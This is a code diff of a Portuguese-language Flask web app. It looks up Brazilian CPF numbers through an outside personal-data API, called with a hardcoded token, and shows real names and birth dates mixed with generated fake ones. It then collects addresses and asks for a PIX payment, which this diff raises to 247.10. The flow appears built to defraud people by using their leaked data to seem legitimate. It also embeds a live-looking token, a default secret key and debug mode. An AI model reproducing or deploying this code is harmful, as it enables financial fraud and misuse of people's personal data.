@@ -1,52 +1,20 @@
 import os
 import requests
 import logging
+import random
 from datetime import datetime, timedelta
 from typing import Dict, Any
 from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
-from flask_sqlalchemy import SQLAlchemy
-from sqlalchemy.orm import DeclarativeBase
-import random
 
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
 
-class Base(DeclarativeBase):
-    pass
-
-db = SQLAlchemy(model_class=Base)
-# create the app
 app = Flask(__name__)
-# setup a secret key, required by sessions
-app.secret_key = os.environ.get("FLASK_SECRET_KEY") or "a secret key"
+app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
+app.static_folder = 'static'
 
-# configure the database, relative to the app instance folder
-database_url = os.environ.get("DATABASE_URL")
-if not database_url:
-    raise RuntimeError("DATABASE_URL environment variable is not set")
-
-# Ensure proper format for PostgreSQL URL
-if database_url.startswith("postgres://"):
-    database_url = database_url.replace("postgres://", "postgresql://", 1)
-
-logger.debug(f"Using database URL: {database_url.split('@')[1]}")  # Log only the host part for security
-
-app.config["SQLALCHEMY_DATABASE_URI"] = database_url
-app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
-    "pool_recycle": 300,
-    "pool_pre_ping": True,
-}
-app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
-
-# initialize the app with the extension
-db.init_app(app)
-
-with app.app_context():
-    # Make sure to import the models here or their tables won't be created
-    import models  # noqa: F401
-    db.create_all()
-    logger.info("Database tables created successfully")
+API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
 # Mapeamento de estados para siglas
 ESTADOS = {
@@ -132,26 +100,21 @@ def gerar_nomes_falsos(nome_real: str) -> list:
     return todos_nomes
 
 def gerar_datas_falsas(data_real: str) -> list:
-    try:
-        # Converte a string de data para objeto datetime
-        data_real_obj = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
-        datas_falsas = []
+    data_real = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
+    datas_falsas = []
 
-        # Gera duas datas falsas próximas à data real
-        for _ in range(2):
-            dias = random.randint(-365*2, 365*2)  # ±2 anos
-            data_falsa = data_real_obj + timedelta(days=dias)
-            datas_falsas.append(data_falsa)
+    # Gera duas datas falsas próximas à data real
+    for _ in range(2):
+        dias = random.randint(-365*2, 365*2)  # ±2 anos
+        data_falsa = data_real + timedelta(days=dias)
+        datas_falsas.append(data_falsa)
 
-        # Adiciona a data real e embaralha
-        todas_datas = datas_falsas + [data_real_obj]
-        random.shuffle(todas_datas)
+    # Adiciona a data real e embaralha
+    todas_datas = datas_falsas + [data_real]
+    random.shuffle(todas_datas)
 
-        # Formata as datas no padrão brasileiro
-        return [data.strftime('%d/%m/%Y') for data in todas_datas]
-    except Exception as e:
-        logger.error(f"Erro ao gerar datas falsas: {str(e)}")
-        return []
+    # Formata as datas no padrão brasileiro
+    return [data.strftime('%d/%m/%Y') for data in todas_datas]
 
 @app.route('/consultar_cpf', methods=['POST'])
 def consultar_cpf():
@@ -322,27 +285,6 @@ def verificar_endereco():
         dados_usuario['endereco'] = endereco
         session['dados_usuario'] = dados_usuario
 
-        try:
-            # Salvar dados do usuário no banco
-            usuario = models.Usuario(
-                nome_completo=dados_usuario['nome_real'],
-                cpf=''.join(filter(str.isdigit, dados_usuario['cpf'])),
-                email=dados_usuario['email'],
-                telefone=dados_usuario['phone'],
-                cep=endereco['cep'],
-                logradouro=endereco['logradouro'],
-                numero=endereco['numero'],
-                complemento=endereco['complemento'],
-                bairro=endereco['bairro'],
-                cidade=endereco['cidade'],
-                estado=endereco['estado']
-            )
-            db.session.add(usuario)
-            db.session.commit()
-        except Exception as e:
-            logger.error(f"Erro ao salvar usuário: {str(e)}")
-            db.session.rollback()
-
         # Redireciona para a página de aviso de pagamento
         return render_template('aviso_pagamento.html',
                             dados={'name': dados_usuario['nome_real'],
@@ -475,45 +417,25 @@ def index():
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    user_data = session.get('dados_usuario')
+    user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
 
     try:
-        # Salvar dados do usuário no banco
-        endereco = user_data.get('endereco', {})
-        usuario = models.Usuario(
-            nome_completo=user_data['nome_real'],
-            cpf=''.join(filter(str.isdigit, user_data['cpf'])),
-            email=user_data.get('email', ''),
-            telefone=user_data.get('phone', ''),
-            cep=endereco.get('cep', ''),
-            logradouro=endereco.get('logradouro', ''),
-            numero=endereco.get('numero', ''),
-            complemento=endereco.get('complemento', ''),
-            bairro=endereco.get('bairro', ''),
-            cidade=endereco.get('cidade', ''),
-            estado=endereco.get('estado', ''),
-            realizou_pagamento=True
-        )
-
-        db.session.add(usuario)
-        db.session.commit()
-
         payment_api = create_payment_api()
         payment_data = {
-            'name': user_data['nome_real'],
-            'email': user_data.get('email', generate_random_email()),
+            'name': user_data['nome_real'], 
+            'email': user_data.get('email', generate_random_email()), 
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()),
-            'amount': 76.17
+            'phone': user_data.get('phone', generate_random_phone()), 
+            'amount': 247.10  
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
         return render_template('pagamento.html',
                            pix_data=pix_data,
-                           valor_total="76,17",
+                           valor_total="247,10",
                            current_year=datetime.now().year)
 
     except Exception as e:
@@ -526,7 +448,7 @@ def pagamento_categoria():
     user_data = session.get('dados_usuario') 
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
-        return redirect(url_for('obrigado'))
+        return redirect(url_for('index'))
 
     categoria = request.form.get('categoria')
     if not categoria:
@@ -585,47 +507,11 @@ def categoria(tipo):
                          current_year=datetime.now().year,
                          user_data=user_data)
 
-@app.route('/apostila', methods=['GET'])
-def apostila():
-    return render_template('apostila.html', current_year=datetime.now().year)
-
-@app.route('/consultar_apostila', methods=['POST'])
-def consultar_apostila():
-    cpf = request.form.get('cpf', '').strip()
-    cpf_numerico = ''.join(filter(str.isdigit, cpf))
-
-    logger.debug(f"Recebido CPF para consulta: {cpf_numerico}")
-
-    if not cpf_numerico or len(cpf_numerico) != 11:
-        logger.warning(f"CPF inválido recebido: {cpf}")
-        flash('CPF inválido. Por favor, digite um CPF válido.')
-        return redirect(url_for('apostila'))
-
-    try:
-        # Buscar usuário no banco de dados
-        usuario = models.Usuario.query.filter_by(cpf=cpf_numerico).first()
-        logger.info(f"Resultado da busca por CPF {cpf_numerico}: {'Encontrado' if usuario else 'Não encontrado'}")
-
-        if usuario:
-            return render_template('comprar_apostila.html',
-                              usuario=usuario,
-                              current_year=datetime.now().year)
-        else:
-            flash('CPF não encontrado em nossa base de dados.')
-            return redirect(url_for('apostila'))
-
-    except Exception as e:
-        logger.error(f"Erro na consulta do CPF: {str(e)}")
-        flash('Erro ao consultar CPF. Por favor, tente novamente.')
-        return redirect(url_for('apostila'))
-
 def generate_random_email():
     return f"user_{random.randint(1,1000)}@example.com"
 
 def generate_random_phone():
     return f"55119{random.randint(10000000,99999999)}"
-
-API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
